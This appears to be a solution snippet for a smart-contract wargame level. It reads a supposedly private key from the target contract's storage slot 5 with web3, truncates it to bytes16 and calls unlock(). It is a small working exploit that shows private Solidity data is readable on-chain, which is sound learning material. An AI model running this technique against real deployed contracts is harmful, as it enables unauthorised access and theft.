// Learn about storage in solidity
// data[2] is stored at 5th index slot and we can simply access it through getStorageAt

let key = await web3.eth.getStorageAt(contract.address, 5); // the data[2];
key = key.slice(0, 34); // while converting types, bytes16 will be held from start to mid
await contract.unlock(key);
await contract.locked();
